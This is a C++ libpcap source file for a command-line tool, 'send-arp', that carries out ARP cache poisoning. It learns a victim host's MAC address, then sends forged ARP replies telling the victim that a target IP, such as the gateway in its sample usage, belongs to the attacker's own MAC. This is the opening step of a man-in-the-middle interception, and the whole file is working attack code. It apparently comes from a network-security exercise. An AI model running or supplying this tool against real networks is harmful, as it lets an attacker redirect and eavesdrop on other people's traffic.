#include <stdio.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void get_local_info(char *device, char *device_ip, char *device_mac) {
    int socket_descriptor;
    struct ifreq device_info;

    socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
    if (socket_descriptor < 0) {
        perror("Error opening socket");
        exit(EXIT_FAILURE);
    }

    strncpy(device_info.ifr_name, device, IFNAMSIZ - 1);
    if (ioctl(socket_descriptor, SIOCGIFHWADDR, &device_info) == -1) {
        perror("Error fetching MAC address");
        close(socket_descriptor);
        exit(EXIT_FAILURE);
    }

    snprintf(device_mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
        (unsigned char)device_info.ifr_hwaddr.sa_data[0],
        (unsigned char)device_info.ifr_hwaddr.sa_data[1],
        (unsigned char)device_info.ifr_hwaddr.sa_data[2],
        (unsigned char)device_info.ifr_hwaddr.sa_data[3],
        (unsigned char)device_info.ifr_hwaddr.sa_data[4],
        (unsigned char)device_info.ifr_hwaddr.sa_data[5]);

    if (ioctl(socket_descriptor, SIOCGIFADDR, &device_info) == -1) {
        perror("Error fetching IP address");
        close(socket_descriptor);
        exit(EXIT_FAILURE);
    }
    strncpy(device_ip, inet_ntoa(((struct sockaddr_in*)&device_info.ifr_addr)->sin_addr), INET_ADDRSTRLEN);

    close(socket_descriptor);
}

EthArpPacket make_arp_request_packet(char* local_mac, char* local_ip, char* sender_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(local_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(local_mac);
    packet.arp_.sip_ = htonl(Ip(local_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    return packet;
}

EthArpPacket make_arp_reply_packet(char* local_mac, char* sender_ip, char* target_ip, Mac target_mac) {
    EthArpPacket packet;
    packet.eth_.dmac_ = target_mac;
    packet.eth_.smac_ = Mac(local_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(local_mac);
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = target_mac;
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    return packet;
}

void send_arp(char *dev, char *sender_ip, char *target_ip, char *local_ip, char *local_mac) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        exit(-1);
    }

    EthArpPacket request_packet = make_arp_request_packet(local_mac, local_ip, sender_ip);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_pkthdr* header;
    const u_char* response_packet;
    res = pcap_next_ex(handle, &header, &response_packet);
    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
        fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        exit(-1);
    }

    EthArpPacket *recv_packet = (EthArpPacket*)response_packet;
    EthArpPacket reply_packet = make_arp_reply_packet(local_mac, sender_ip, target_ip, recv_packet->eth_.smac_);

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reply_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    printf("\nARP Packet Sent!\n");
    printf("Sender IP: %s\nTarget IP: %s\n", sender_ip, target_ip);

    pcap_close(handle);
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc & 1) {
        printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\nsample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
	return -1;
    }

    char local_ip[INET_ADDRSTRLEN];
    char local_mac[18];

    get_local_info(argv[1], local_ip, local_mac);

    for (int i = 2; i < argc; i = i+2) {
        send_arp(argv[1], argv[i], argv[i+1], local_ip, local_mac);
    }

    return 0;
}

